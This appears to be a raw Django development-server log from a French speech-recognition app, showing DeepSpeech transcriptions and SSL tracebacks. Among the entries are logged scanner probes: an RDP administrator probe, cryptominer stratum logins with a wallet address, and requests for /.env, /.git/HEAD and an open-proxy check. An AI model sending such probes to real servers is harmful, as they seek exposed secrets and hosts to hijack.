+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 50666)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 50672)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 50688)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 50696)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 50700)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 56610)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 56622)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 56630)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 56642)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 56654)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 54602)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+[09/Feb/2024 23:09:57] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[09/Feb/2024 23:09:57] "  ,'à     Cookie: mstshash=Administrator" 400 -
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 54626)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+[09/Feb/2024 23:10:00] code 400, message Bad request syntax ('\x01I20100')
+[09/Feb/2024 23:10:00] "I20100" 400 -
+Not Found: /
+[09/Feb/2024 23:12:21] "GET / HTTP/1.0" 404 2170
+[09/Feb/2024 23:33:15] code 400, message Bad request syntax ('{"method":"login","params":{"login":"45JymPWP1DeQxxMZNJv9w2bTQ2WJDAmw18wUSryDQa3RPrympJPoUSVcFEDv3bhiMJGWaCD4a3KrFCorJHCMqXJUKApSKDV","pass":"xxoo","agent":"xmr-stak-cpu/1.3.0-1.5.0"},"id":1}')
+[09/Feb/2024 23:33:15] "{"method":"login","params":{"login":"45JymPWP1DeQxxMZNJv9w2bTQ2WJDAmw18wUSryDQa3RPrympJPoUSVcFEDv3bhiMJGWaCD4a3KrFCorJHCMqXJUKApSKDV","pass":"xxoo","agent":"xmr-stak-cpu/1.3.0-1.5.0"},"id":1}" 400 -
+[09/Feb/2024 23:33:16] code 400, message Bad request syntax ('{"id":1,"method":"mining.subscribe","params":[]}')
+[09/Feb/2024 23:33:16] "{"id":1,"method":"mining.subscribe","params":[]}" 400 -
+[09/Feb/2024 23:33:17] code 400, message Bad request version ('"mining.authorize"}')
+[09/Feb/2024 23:33:17] "{"params": ["miner1", "password"], "id": 2, "method": "mining.authorize"}" 400 -
+[09/Feb/2024 23:33:18] code 400, message Bad request version ('x64"}}')
+[09/Feb/2024 23:33:18] "{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"blue1","pass":"x","agent":"Windows NT 6.1; Win64; x64"}}" 400 -
+[09/Feb/2024 23:33:19] code 400, message Bad request version ('"mining.submit"}')
+[09/Feb/2024 23:33:19] "{"params": ["miner1", "bf", "00000001", "504e86ed", "b2957c02"], "id": 4, "method": "mining.submit"}" 400 -
+[09/Feb/2024 23:33:20] code 400, message Bad request syntax ('{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"x","pass":"null","agent":"XMRig/5.13.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","rx/0","rx/wow","rx/loki","rx/arq","rx/sfx","rx/keva"]}}')
+[09/Feb/2024 23:33:20] "{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"x","pass":"null","agent":"XMRig/5.13.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","rx/0","rx/wow","rx/loki","rx/arq","rx/sfx","rx/keva"]}}" 400 -
+Not Found: /
+[09/Feb/2024 23:41:30] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /core/.git/HEAD
+[09/Feb/2024 23:50:55] "GET /core/.git/HEAD HTTP/1.0" 400 65507
+Invalid HTTP_HOST header: '141.98.7.179'. You may need to add '141.98.7.179' to ALLOWED_HOSTS.
+Bad Request: /a.php
+[10/Feb/2024 00:00:52] "GET /a.php?pro=45.139.199.217:80 HTTP/1.0" 400 65634
+Not Found: /
+[10/Feb/2024 00:11:29] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[10/Feb/2024 00:21:46] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[10/Feb/2024 00:36:23] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[10/Feb/2024 01:14:11] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[10/Feb/2024 01:14:16] "GET / HTTP/1.0" 400 65215
+Not Found: /
+[10/Feb/2024 01:19:10] "GET / HTTP/1.0" 404 2170
+Not Found: /.env
+[10/Feb/2024 01:20:20] "GET /.env HTTP/1.0" 404 2197
+/var/www/ai_speech/ai_speech/settings.py changed, reloading.
+Validating models...
+
+February 06, 2024 - 17:00:17
+Django version 3.2.23, using settings 'ai_speech.settings'
+Starting development server at https://0.0.0.0:8001/
+Using SSL certificate: /var/www/ai_speech/venv/lib/python3.7/site-packages/sslserver/certs/development.crt
+Using SSL key: /var/www/ai_speech/venv/lib/python3.7/site-packages/sslserver/certs/development.key
+Quit the server with CONTROL-C.
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpn7_p7tcv.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpn7_p7tcv.wav']
+Okunan: non moi maison il est en colora sont très sombres
+
+71.15
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpi_e2f2tf.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpi_e2f2tf.wav']
+Okunan: dans ma maison il y a un couloir sombre très centre
+
+86.79
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpf3rhv_18.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpf3rhv_18.wav']
+Okunan: au bout du couloir il y a une porte sombre très sombre
+
+94.64
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp31ew4o3i.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp31ew4o3i.wav']
+Okunan: derrière le porte il y a un champ centre très centre
+
+72.07
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmppapzvpgk.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmppapzvpgk.wav']
+Okunan: dans la chambre et il y a un et semble les sombres
+
+78.43
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmptrqwsf7s.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmptrqwsf7s.wav']
+Okunan: sous le lit il y a ma boite semble ressemble
+
+71.58
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp3x8csbv6.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp3x8csbv6.wav']
+Okunan: dans la maison il vient en robe sont très en
+
+60.61
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpzaplzyaj.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpzaplzyaj.wav']
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp66_iswj7.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp66_iswj7.wav']
+Okunan: ce quest avatar
+
+17.14
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpzkg594lx.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpzkg594lx.wav']
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpl7bnnzt_.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpl7bnnzt_.wav']
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpqat3fj8p.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpqat3fj8p.wav']
+Okunan: 
+
+0.0
+Okunan: il a peine
+
+21.54
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp_q8ndosi.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp_q8ndosi.wav']
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmps7d0nko5.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmps7d0nko5.wav']
+Okunan: dans son paramilitaires
+
+38.46
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmplc_nqbx5.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmplc_nqbx5.wav']
+Okunan: en élaborant ce sont
+
+24.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp_v3j75c5.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp_v3j75c5.wav']
+Okunan: 
+
+0.0
+/var/www/ai_speech/venv/lib/python3.7/site-packages/pydub/utils.py:170: RuntimeWarning: Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work
+  warn("Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work", RuntimeWarning)
+Watching for file changes with StatReloader
+System check identified some issues:
+
+WARNINGS:
+stt_app.voice: (models.W042) Auto-created primary key used when not defining a primary key type, by default 'django.db.models.AutoField'.
+	HINT: Configure the DEFAULT_AUTO_FIELD setting or the SttAppConfig.default_auto_field attribute to point to a subclass of AutoField, e.g. 'django.db.models.BigAutoField'.
+
+System check identified 1 issue (0 silenced).
+Not Found: /stt/
+[10/Feb/2024 06:35:49] "GET /stt/ HTTP/1.0" 404 3072
+[10/Feb/2024 06:36:03] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[10/Feb/2024 06:36:15] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+Not Found: /
+[10/Feb/2024 06:39:01] "GET / HTTP/1.0" 404 2189
+Not Found: /
+[10/Feb/2024 06:45:42] "GET / HTTP/1.0" 404 2170
+[10/Feb/2024 06:53:10] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 53
+[10/Feb/2024 06:53:27] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 35
+[10/Feb/2024 06:53:51] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 44
+[10/Feb/2024 06:54:08] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 50
+[10/Feb/2024 06:55:32] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 59
+[10/Feb/2024 06:56:04] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 67
+[10/Feb/2024 06:56:24] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 56
+[10/Feb/2024 06:56:36] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 82
+[10/Feb/2024 06:56:54] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 71
+[10/Feb/2024 06:57:07] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 80
+[10/Feb/2024 06:57:23] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 82
+[10/Feb/2024 06:57:44] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 73
+[10/Feb/2024 06:58:00] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 71
